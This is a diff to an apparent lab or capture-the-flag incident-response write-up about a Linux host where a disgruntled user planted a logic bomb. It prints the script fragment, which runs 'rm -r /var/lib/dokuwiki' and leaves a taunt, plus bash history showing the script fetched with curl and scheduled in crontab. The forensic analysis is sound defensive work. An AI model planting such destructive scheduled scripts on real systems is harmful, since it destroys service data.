@@ -16,4 +16,41 @@ User created - it-admin
 Date sudo was given - Dec 28 06:27:34
 Script file name - bomb.sh
 ```
-To find more information on bomb.sh, I will be looking in the .bash_history file. The command used to created the file was curl 10.10.158.38:8080/bomb.sh --output bomb.sh. the file was then renamed and moved to  
+To find more information on bomb.sh, I will be looking in the .bash_history file. The command used to created the file was curl 10.10.158.38:8080/bomb.sh --output bomb.sh. the file was then renamed and moved to the /bin folder as "os-update.sh". Fle contents below.  
+```
+if [ -z "$OUTPUT" ]; then
+        rm -r /var/lib/dokuwiki
+        echo -e "I TOLD YOU YOU'LL REGRET THIS!!! GOOD RIDDANCE!!! HAHAHAHA\n-mistermeist3r" > /goodbye.txt
+fi
+```
+This file appears to delete service files if triggered. We can also see from the .bash_history, that the file was scheduled in crontab to go off at 08:00 as well.  
+```
+# History of marks within files (newest to oldest):
+
+> /bin/os-update.sh
+*16722089880
+"60
+root@ip-10-10-28-147:/home/it-admin# cat .bash_history 
+whoami
+curl 10.10.158.38:8080/bomb.sh --output bomb.sh
+ls
+ls -la
+cd ~/
+curl 10.10.158.38:8080/bomb.sh --output bomb.sh
+sudo vi bomb.sh
+ls
+rm bomb.sh
+sudo nano /etc/crontab
+exit
+root@ip-10-10-28-147:/home/it-admin# cd ../../et/crontab
+-bash: cd: ../../et/crontab: No such file or directory
+root@ip-10-10-28-147:/home/it-admin# cd ../../etc/crontab
+-bash: cd: ../../etc/crontab: Not a directory
+root@ip-10-10-28-147:/home/it-admin# cd ../..
+root@ip-10-10-28-147:/# ls
+```
+
+After finding out all of that information we can succesfuly close the incident! 
+
+TLDR : analyzed a machine to discover a disgruntled user downloaded a script that would delete all the files installed with a service if the use has not logged in to this machine in 30 days, a perfect example of a logic bomb. 
+
